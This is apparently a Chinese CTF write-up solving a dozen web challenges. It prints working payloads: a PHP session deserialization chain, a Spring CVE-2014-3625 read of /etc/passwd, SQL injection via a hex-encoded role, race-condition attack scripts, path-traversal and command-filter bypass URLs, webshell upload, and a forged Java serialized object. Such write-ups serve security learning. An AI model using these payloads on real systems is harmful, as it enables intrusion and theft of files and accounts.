#### PHP序列化：
可以直接看到index.php的源码:
``` php
<?php
//error_reporting(E_ERROR & ~E_NOTICE);
ini_set('session.serialize_handler', 'php_serialize');
header("content-type;text/html;charset=utf-8");
session_start();
if(isset($_GET['src'])){
    $_SESSION['src'] = $_GET['src'];
    highlight_file(__FILE__);
    print_r($_SESSION['src']);
}
?>
<!DOCTYPE HTML>
<html>
 <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>代码审计2</title>
 </head>
 <body>
 在php中，经常会使用序列化操作来存取数据，但是在序列化的过程中如果处理不当会带来一些安全隐患。
<form action="./query.php" method="POST">        
<input type="text" name="ticket" />               
<input type="submit" />
</form>
<a href="./?src=1">查看源码</a>
</body>
</html>
```
然后访问query.php的时候提示：
> Look me: edit by vim ~0~

试了一下vim备份文件的后缀，query.php~可以读到源码：
``` php
//query.php 部分代码
session_start();
header('Look me: edit by vim ~0~')
//......
class TOPA{
	public $token;
	public $ticket;
	public $username;
	public $password;
	function login(){
		//if($this->username == $USERNAME && $this->password == $PASSWORD){ //抱歉
		$this->username =='aaaaaaaaaaaaaaaaa' && $this->password == 'bbbbbbbbbbbbbbbbbb'){
			return 'key is:{'.$this->token.'}';
		}
	}
}
class TOPB{
	public $obj;
	public $attr;
	function __construct(){
		$this->attr = null;
		$this->obj = null;
	}
	function __toString(){
		$this->obj = unserialize($this->attr);
		$this->obj->token = $FLAG;
		if($this->obj->token === $this->obj->ticket){
		   return (string)$this->obj;
		}
	}
}
class TOPC{
	public $obj;
	public $attr;
	function __wakeup(){
		$this->attr = null;
		$this->obj = null;
	}
	function __destruct(){
		echo $this->attr;
	}
}
```
很明显需要序列化。在index.php里面设置了php的序列化handler是'php_serialize'，而query.php里面没有设置，也就是默认的'php'，所以可以利用session反序列化调用query.php里面的类。
只有TOPC有echo，分析了一下，构造顺序应该是：
> TOPC  >  TOPB  >  TOPA

其中有几个点：
###### 1. __wakeup可以通过改变属性数目大于实际数目绕过
###### 2. 通过建立引用关系使得$this->obj->token和$this->obj->ticket保持相等
###### 3. username和password可以直接取0，0弱等于字符串
试了一下，感觉线上的源码不太一样，会调用login，并且反序列化的时候会先反序列化内层的
构造payload：
> |O:4:"TOPC":3:{s:3:"obj";N;s:4:"attr";O:4:"TOPB":2:{s:3:"obj";N;s:4:"attr";s:84:"O:4:"TOPA":4:{s:5:"token";N;s:6:"ticket";R:2;s:8:"username";i:0;s:8:"password";i:0;}";}}

在index.php设置一下session，再访问query.php就行了
#### spring-css：
google了一下，有一个CVE的洞**[cve-2014-3625](https://github.com/ilmila/springcss-cve-2014-3625)**
链接里面有exp，读一下/etc/passwd，发现：
> flag:x:1000:1000:Linux User,,,:/home/flag:/etc/flag

根据提示再读/etc/flag
> http://218.2.197.232:18015/spring-css/resources/file:/etc/flag

#### 注入越权：
源码有提示：
``` html
<!--
2015.10.16
防越权改造，当uid=0且role=admin时显示管理员页面。
 -->   
```
发现uid可以直接修改，修改role不行，输引号会被mysql_escape_string拦 。
试了一下发现uid输反引号会报错，看了一下大概是update语句，所以可以注入设置role，引号不能用，就用admin的十六进制代替，也就是
> uid=0,role=0x61646d696e

修改后返回原页面，得到flag

#### 条件竞争：
题目给了源码，看了一下在reset密码时存在条件竞争漏洞，reset时有两步：
1. 先将该用户信息清空并新插入一条信息，这时notadmin为False
2. 然后再将notadmin设置为True

那么只要在第二步之前登录即可，所以跑两个程序，一个reset，一个login即可，我这里分别开了15个协程：
##### reset.py
``` py
import requests
from gevent import monkey
import gevent
monkey.patch_all()

def reset():
    for i in range(100):
        cookies = {'PHPSESSID':'crr472f26gv9ef64rcu39obu01'}
        a = requests.post("http://218.2.197.232:18009/index.php?method=reset",data={'name':'c610599c37103bf5','password':'zzm'},cookies=cookies).text
        print(a)

tasks = [gevent.spawn(reset) for i in range(15)]
gevent.joinall(tasks)
```
##### login.py
``` py
import requests
from gevent import monkey
import gevent
monkey.patch_all()

def login():
    for i in range(100):
        cookies = {'PHPSESSID':'crr472f26gv9ef64rcu39obu01'}
        b = requests.post("http://218.2.197.232:18009/login.php?method=login",data={'name':'c610599c37103bf5','password':'zzm'},cookies=cookies).text
        print(b)

tasks = [gevent.spawn(login) for i in range(15)]
gevent.joinall(tasks)
```
很快就能读到flag：

![image.png](http://upload-images.jianshu.io/upload_images/2511560-4006fb816f0c1a49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### 读文件：
只给了个1.txt可以读，试了一下加*不行，感觉不是命令执行，"../"返回上级目录也不行，猜测可能过滤了什么，在1.txt中间加上"./"发现仍能读取，说明"./"被过滤了，构造payload，在上级目录的flag.php的注释里读到flag
> http://218.2.197.232:18008/a/down.php?p=...//fla./g.php

#### Web综合：
发现有.svn泄露,下载下来sqlite数据库文件，找到settings.inc.php的checksum，然后在
> http://218.2.197.232:18007/.svn/pristine/c6/c63308801a9ec3b0c1aea96b061c00b1666adebb.svn-base

可以读到源代码，源码里有admin的密码，登陆上去可以上传图片，这里上传一个图片马就行了，只验证了content-type，菜刀连上去后，在07目录下找到f1a9.php
#### RCE绕过：
命令前后需要空格，但是被过滤，用%0a绕过，命令中的空格就不行了，fuzz一下，发现%09可以。另外"."也被过滤了，可以用*，于是直接读到flag.php：
> http://218.2.197.232:18006/?cmd=%0acat%09fla*%0a

#### JAVA序列化：
网上找了个JAVA序列化的例子，推测了一下大概的格式，然后把题目的object的id和name对应修改一下，再Base64就OK了
> rO0ABXNyAA9jb20uY3RmLmNuLlVzZXIAAAAAA/kvvQIAAkwAAmlkdAATTGphdmEvbGFuZy9JbnRlZ2VyO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABdAAFYWRtaW4=

#### 变态验证码怎么过：
网上搜了一下几种绕验证码的方式，都试了一下，发现只要第一次输对了验证码，后面直接把验证码设为空串就行了，然后用Burp和他给的password.txt爆破一下就行了

#### Forbidden：
注释提示要本机访问，各种改头部没用，后来发现改成localhost才行，也是醉了，然后后续每次修改都会有个提示，改Host啊，改Referer，改UA什么的，一步一步来就能得到最后flag

#### 热身题：
扫了一下目录发现robots.txt，挨个读了一下里面的文件，最后在rob0t.php里面读到flag